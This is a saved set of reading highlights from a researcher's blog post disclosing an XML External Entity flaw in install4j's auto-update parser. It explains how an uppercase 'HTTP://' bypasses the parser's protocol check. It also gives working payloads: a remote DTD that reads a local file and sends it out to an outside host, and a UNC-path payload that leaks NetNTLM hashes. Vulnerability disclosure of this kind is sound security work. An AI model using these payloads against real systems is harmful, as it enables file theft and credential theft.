---
author: Frycos Security Diary
aliases:
  - XXE With Auto-Update in Install4j
tags:
  - RW_inbox
  - readwise/articles
url: https://frycos.github.io/vulns4free/2023/02/12/install4j-xxe.html
created: 2025-01-09
---
# XXE With Auto-Update in Install4j

![rw-book-cover](https://frycos.github.io/assets/images/install4j/install4j_3.png)

## Highlights


XXE with Auto-Update in install4j
> [View Highlight](https://read.readwise.io/read/01jh5p4swf378433x5ftcbswsg)



install4j is a powerful multi-platform Java installer builder that generates native installers and application launchers for Java applications.
> [View Highlight](https://read.readwise.io/read/01jh5p52jtg3thdcx0z22bstvw)



The latest version **10.0.4** (and former versions) of **install4j** is vulnerable to a XML External Entity (XXE) attack. Products using install4j with its **(automatic) update** feature could be exploited, if connections to the *update server* are successfully controlled in some way. If any affected product triggers an update check (scheduled or manually), the update server responds with a *XML file* containing information about available software versions with attributes pointing to the newest version, file hashes for verification etc. This delivered XML content is read by the client system with the product installed and **parsed insecurely**.
> [View Highlight](https://read.readwise.io/read/01jh5p5cykzdr4devpazbtbcg6)



It seems some default XXE mitigations were put into place by the `downloadExternalEntities` member being set to `false` as mentioned above. This will lead us into the `if` branch at `[6]`, checking for `PUBLIC` and `SYSTEM` identifiers in the XML being parsed. Even though `startsWith("http:/")` and `startsWith("https:/")` checks at `[7]` should take care of preventing disallowed **(external) entities and document type declarations**, referencing a remote **DTD** file then being fetched with a HTTP request, this can be easily bypassed by e.g. using **UPPERCASE** protocol handler definitions such as `SYSTEM "HTTP://ATTACKERSERVER/BAD.DTD"`. Finally, the dangerous sink at `[8]` is called. Additionally other file protocol handlers such as `file://` or `jar://` are not taken into account, yet. Note that the `EntityResolver` protection given by [OWASP XXE Mitigations](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#no-op-entityresolver) is more restrictive and should have been the way to go.
> [View Highlight](https://read.readwise.io/read/01jh5pfw7a3q49s6psmcwn9dzb)



But in general, several cases allow an easy hijack of the update server communication:
 • The product chooses to use HTTP instead of HTTPS connections
 • The `acceptAllCertificates` attribute is set to `true` in the install4j configuration file such that TLS/SSL verification gets deactivated with help of the install4j method `private Runnable acceptAllCertificates()`
 • A central TLS/SSL inspection component would break the trusted chain of verification depending on its (mis)configuration (already seen “in-the-wild” :-P)
 • There exist other cases but this is not the main purpose of this blog post to list them all
 Note that this hijacking part is not a vulnerability in install4j itself but depends on certain configurations of install4j and server infrastructure on the affected product side, respectively. Nevertheless, this is a valid attack vector and should not lead to a vulnerable sink indeed existing in install4j: the XXE described above.
> [View Highlight](https://read.readwise.io/read/01jh5phy9h0z6th220cmgprqv3)



The following XML content will be delivered then by our attacker server:
> [View Highlight](https://read.readwise.io/read/01jh5pn0d89xw5mrax740qx27d)



<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE data SYSTEM "HTTP://downloads.prosysopc.com/XXE.dtd"> <data>&send;</data>
> [View Highlight](https://read.readwise.io/read/01jh5pn4mcw3pz7690ac2jx2d1)



This will fetch the `DTD` file remotely from the same update server with the following content:
 <!ENTITY % file SYSTEM "file:///C:/Users/user/Desktop/secret.txt">
 <!ENTITY % all "<!ENTITY send SYSTEM 'HTTP://downloads.prosysopc.com/%file;'>">
 %all;
> [View Highlight](https://read.readwise.io/read/01jh5pndqpdg26qns81xda0mf6)



Since this is a Windows system, we could create XXE payloads with `file://` protocol handlers. Defining a remote network share could then lead to leakage of hashed Windows server credentials (NetNTLM hash). These hashes could be cracked (or relayed) and used to directly login into the victim machines etc.
> [View Highlight](https://read.readwise.io/read/01jh5pr077vecjn6vnj9mhsnrn)



<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE data SYSTEM "file:////downloads.prosysopc.com/myshare/file.dll"> <data>&send;</data>
> [View Highlight](https://read.readwise.io/read/01jh5pr53caj6gmajzcq91mhmx)



There are even more attack vectors by using the `jar://` protocol handler, fetching a remote JAR file with attacker-controlled arbitrary file content (it even doesn’t have to be a JAR file). This is a variant of arbitrary file upload and could be used in further exploitation steps, depending on the specific target. For a beautiful chain read [this blog post](https://www.horizon3.ai/red-team-blog-cve-2022-28219/) for example.
> [View Highlight](https://read.readwise.io/read/01jh5prrjzh3ccartqsyc27mp3)

